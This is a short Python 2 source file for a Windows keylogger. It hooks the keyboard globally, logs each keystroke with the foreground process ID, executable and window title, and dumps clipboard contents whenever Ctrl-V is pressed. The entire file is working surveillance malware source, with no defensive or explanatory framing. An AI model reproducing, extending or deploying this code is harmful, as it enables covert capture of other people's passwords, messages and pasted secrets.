#!/usr/bin/env python

import pyHook 
import pythoncom
from ctypes import *
import win32clipboard


user32   = windll.user32
kernel32 = windll.kernel32
psapi    = windll.psapi
current_window = None


def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    print "\n[ PID: %s - %s - %s ]\n" % (process_id, executable.value, window_title.value)
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

    
def KeyStroke(event):
    global current_window   

    if event.WindowName != current_window:
        current_window = event.WindowName        
        get_current_process()

    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii),
    else:
        # if [Ctrl-V], get the value on the clipboard added by Dan Frisch 2014
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print "[PASTE] - %s" % (pasted_value),
        else:
            print "[%s]" % event.Key,

    return True


if __name__ == '__main__':
    kl = pyHook.HookManager()
    kl.KeyDown = KeyStroke
    kl.HookKeyboard()
    pythoncom.PumpMessages()
